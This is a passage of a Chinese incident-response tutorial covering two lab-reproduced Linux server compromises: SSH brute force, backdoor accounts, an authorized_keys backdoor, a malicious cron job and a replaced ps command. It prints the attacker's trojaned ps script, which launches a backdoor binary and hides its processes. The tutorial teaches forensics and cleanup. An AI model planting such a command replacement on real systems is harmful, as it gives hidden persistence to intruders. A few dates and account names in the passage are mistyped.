#强制删除该账户以及/home/sclipicibosu
sudo userdel -rf sclipicibosu 
#加上-r 可以删除/home/路径下的用户文件夹，否则不能
```

#### **查看是否有** **ssh** **公钥后门**

**查看 zyr 是否含有 ssh 公钥后门**

```
cd /home/zyr/.ssh
cat authorized_keys
```

发现已经被写入了 ssh 公钥后

**查看 ssh 公钥**

```
stat authorized_keys
```

写入时间为：20220 2-15 16：34：42

**删除 ssh 公钥后门**

```
rm -f authorized_keys
```

#### **查看是否有** **perl** **脚本** **SSH** **后门**

首先正常的 sshd 文件是 ELF 格式，而后门是纯文本脚本，使用 file 命令就可以发现

```
cd /usr/bin
file sshd

# ASCII text
```

查看发现 sshd 文件已经被修改，变成纯文本脚本

查看 sshd 文件内容

```
cat /usr/bin/sshd
```

虽然被修改了，但不是 perl 脚本 SSH 后门，其中 rsync 命令和 cp 命令很像，但是功能似乎

更加复杂点，主要用来备份数据，无害。但已经被修改了，还是删除

### 总结

**发现后门账户 sclipicibosu，并且删除该账户**

**发现 zyr 账户被写入了 ssh 公钥后门，并且已删除该后门**

---

### 入侵路径排查

1、查看 root 和 zyr 定时任务创建时间为：20220217 10:27:33

2、查看 b4nd1d0 文件创建时间为：20220217 10：29：13

stat .b4nd1d0

3、查看 placi 文件创建时间

stat placi

4、查看 ssh 公钥写入时间为：20220215 16：34：42

stat authorized_keys

推测入侵时间是 20220215 16：34：42，接下来排查安全日志

5、查看 Ubuntu 系统的安全日志：auth.log

```
cd /var/log
sudo gzip -d auth.log.1.gz #解压 auth.log.1.gz 文件
sudo gzip -d auth.log.2.gz #
sudo gzip -d auth.log.3.gz
sudo gzip -d auth.log.4.gz
```

#### **统计登录失败的记录命令**

共有 782 次的登录失败，可能遭受到了暴力破解

```
grep -o "Failed password" /var/log/auth* |uniq -c
```

#### 查询被爆破的用户名都有哪些以及被爆破的次数

```
grep "Failed password" /var/log/auth*|perl -e 'while($_=<>){ /for(.*?) from/; print "$1\n";}'|uniq -c|sort -nr
```

发现 zyr 账户被爆破 445 次，wxiaoge 账户被爆破 337 次

#### 查询用户最近登录情况

```
grep "Accepted " /var/log/auth* | awk '{print $1,$2,$3,$9,$11}'
```

#### 再查看 wxiaoge 账户的爆破时间段

```
grep "Failed password" /var/log/auth*|grep wxiaoge
```

查看日志发现 wxiaoge 账户从 20220215 15:46:15——20220215 15:48:38

#### 再查看 zyr 账户的爆破时间段

```
grep "Failed password" /var/log/auth*|grep "zyr from"
```

查看日志发现 wxiaoge 账户从 20220215 15:59:08——20220215 16:04:19

再结合用户最近登录情况，wxiaoge 账户在遭受爆破期间 20220215 15:46:15——2022021515:48:38 成功登录过一次，登录时间为 20220215 15:48:37，zyr 账户在遭受爆破期间20220215 15:59:08——20220215 16:04:19 成功登录过一次，登录时间为 20220215 16:04:17。由此证明，服务器是被 ssh 爆破出 wxiaoge、zyr 账户之后入侵并植入挖矿病毒与 ssh 公钥后门。

### 总结

服 务 器 在 20220215 15:46:15——20220215 15:48:38 、 20220215 15:59:08——2022021516:04:19 期间被 192.168.226.1 进行 ssh 爆破，并且爆破出 wxiaoge、zyr 账户之后登录服务器，并且在 20220215 16:34:42 植入 ssh 公钥后门，在 20220216 16:17:40 植入挖矿病毒。

---

## Linux服务器综合应急案例三

### 事件背景

某天客户反馈：服务器疑似被入侵，与恶意 IP 进行通信（恶意 IP 用 192.168.226.131 代替）。

（真实案例自己搭建环境复现一下，靶场环境放在了 知识星球 和 我的资源 中）

**受害服务器：** **Centos** **系统、****IP****：** **192.168.226.132****、无** **WEB** **服务**

---

### 排查网络连接

查看服务器的网络连接，发现服务器 192.168.226.132 一直与恶意 IP：192.168.226.131 的 6666

端口连接，并且程序名为：shell.elf、PID 号为 11393、12874

```
netstat -anpt
```

其中 连接状态为 “SYN_SENT”的异常通信，隔段时间就会重新发起，进程 PID 号都不一样

**根据PID号查找程序位置：/root/shell.elf**

```
lsof -p 11393
```

**查看shell.elf文件的创建时间**

```
stat shell.elf
```

查看 shell.elf 文件的创建时间为：2022-01-14 00:51:12

---

之后将 shell.elf 文件放在微步

微步云沙箱上检测发现，是后门文件

---

### 排查历史命令

**查看历史执行命令**

```
history
```

**然后在root账户下排查历史命令，看看是否有黑客执行的命令**

```
cd /root
cd .bash_history
```

发现历史命令已经被黑客清空

---

### 排查后门账户

#### **查看当前登录系统的用户**

```
who
```

#### **查看特权账户**

```
awk -F: '$3==0 {print$1}' /etc/passwd
```

发现有两个特权账户：root、wxiaoge，与客户沟通后确定 wxiaoge 是黑客创建

#### **查看可以远程登录的帐号信息**

```
awk '/\$1|\$6/{print $1}' /etc/shadow
```

又有 wxiaoge，确定了 wxiaoge 是黑客的后门账户

#### **查看用户最近登录情况**

```
grep "Accepted " /var/log/secure* | awk '{print $1,$2,$3,$9,$11}'
```

发现 wxiaoge 账户在 1 月 14 日 00:47:33 登录了该服务器（其中 IP 地址 192.168.226.1 因

为是模拟，没有公网地址，所以假设它是恶意 IP）

---

### 排查crontab后门

```
crontab -l

或者
cd /var/spool/cron
cat root
```

发现存在 root 账户的定时任务，每分钟执行一次 /root/shell.elf 文件

---

### 排查是否有命令被替换

#### 检查命令文件是否被替换

```
rpm -Vf /usr/bin/*
rpm -Vf /usr/sbin/*




#rpm -Vf /usr/bin/xxx
#S 关键字代表文件大小发生了变化
#5 关键字代表文件的 md5 值发生了变化
#T 代表文件时间发生了变化
```

**执行命令： rpm -Vf /usr/bin/* 时发现 ps 命令的文件大小、md5 值、时间发生了变化，可能已经被修改**

#### 查看 ps 命令内容

```
cd /usr/bin/
ls -al ps
cat ps
```

查看 ps 文件内容发现被修改了

被修改成以下内容

```
#!/bin/bash
/centos_core.elf & /.hide_command/ps |grep -v "shell" | grep -v "centos_core" | grep "bash"


#每次执行 ps 命令都会执行 centos_core.elf 文件、.hide_command/ps 文件
#grep -v 的意思是只打印没有匹配的，而匹配的反而不打印，相当于隐藏 shell、centos_core、bash 异常文件信息
```

#### **查看 centos_core.elf 文件创建时间**

**2022-01-14 00:57:03.954050367 -0500**

```
stat centos_core.elf
```

将 centos_core.elf 文件放在微步云沙箱检测是后门文件

发现.hide_command/ps 文件为正常的 ps 文件

#### 小结

存在ps命令后门，将正常的ps命令替换，每执行一次 ps 命令 /centos_core.elf 后门文件就会被执行一次

```
注意：
/bin 是系统的一些指令。
bin 为 binary 的简写主要放置一些系统的必备执行档例如:cat、cp、chmod df、dmesg、
gzip、kill、ls、mkdir、more、 mount、rm、su、tar 等。
/sbin 一般是指超级用户指令。
（system binary）主要放置一些系统管理的必备程式例如:cfdisk、dhcpcd、dump、e2fsck、
fdisk、halt、ifconfig、ifup、 ifdown、init、insmod、lilo、lsmod、mke2fs、modprobe、quotacheck、
reboot、rmmod、 runlevel、shutdown 等。
/usr/bin 是你在后期安装的一些软件的运行脚本。
主要放置一些应用软体工具的必备执行档例如 c++、g++、gcc、chdrv、diff、dig、du、
eject、elm、free、gnome*、 gzip、htpasswd、kfm、ktop、last、less、locale、m4、make、
man、mcopy、ncftp、 newaliases、nslookup passwd、quota、smb*、wget 等。
/usr/sbin 放置一些用户安装的系统管理的必备程式。
例如:dhcpd、httpd、imap、in.*d、inetd、lpd、named、netconfig、nmbd、samba、sendmail、
squid、swap、tcpd、tcpdump 等。
```

---

### 总结

**1、找到后门文件：/root/shell.elf**

**2、找到后门账户：wxiaoge**

**3、找到恶意定时任务**

**4、发现ps命令被替换留 ps 命令后门**

---

### 处置方式

#### 1、清除后门文件

```
rm -rf /root/shell.elf
rm -rf /centos_core.elf
```

#### 2、将ps命令删除再将.hide_command/ps

```
rm -rf /usr/bin/ps
mv /.hide_command/ps /usr/bin/ps
```

#### 3、删除后门账户

```
vi /etc/passwd
#vi 编辑额 passwd 文件，按 dd 删除 wxiaoge 那一行，之后保存并推出

或者
sudo userdel -r wxiaoge
```

---

### 查看入侵路径

#### 查看后门

**查看 shell.elf 文件的创建时间为：2022-01-14 00:51:12**

```
stat shell.elf
```

**查看 定时任务 root 文件的创建时间为：2022-01-14 01:05:53**

```
cd /var/spool/cron
stat root
```

**查看 centos_core.elf 文件创建时间为：2022-01-14 00:57:03**

```
stat centos_core.elf
```

**查看 ps 命令文件修改时间为：2022-01-14 01:03:42**

```
cd /usr/bin/
stat ps
```

#### 小结

**植入后门的顺序为：shell.elf后门、centos_core.elf 后门、ps 命令替换后门、定时任务**

---

### 排查安全日志

#### 查看secure日志，得到爆破的时间范围

```
cd /var/log
cat secure* |grep Failed
```

**1.13 21：51：32——21：58：31**

#### 查询有哪些 IP 在爆破命令

```
grep "Failed password" /var/log/secure* | grep -E -o "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)" | uniq -c

#878 192.168.226.1
```

#### 查询被爆破的用户名都有哪些

```
grep "Failed password" /var/log/secure*|perl -e 'while($_=<>){ /for(.*?) from/; print "$1\n";}'|uniq -c|sort -nr

#878 root
```

#### 接下来查看用户最近登录情况

```
grep "Accepted " /var/log/secure* | awk '{print $1,$2,$3,$9,$11}'
```

**发现 root 账户在 1 月 13 日 21:57:56 登录了该服务器，在爆破的时间范围内（21:51:32——21:58:31）**

**wxiaoge 账户在 1 月 14 日 00:47:33 登录了该服务器（其中 IP 地址 192.168.226.1 因为是模拟，没有公网地址，所以假设它是恶意 IP）**

---

### 总结

**黑客在 1 月 13 日 21:51:32——21:58:31 对服务器进行爆破，且在 21:57:56 成功爆破出 root账户密码并且进行登录，登录之后在 1 月 14 日 00:51:12 植入了 shell.elf 后门、在 00:57:03植入了 centos_core.elf 后门、在 01:03:42 植入了 ps 命令后门、在 01:05:53 写了恶意定时任务，恶意 IP：192.168.226.1**





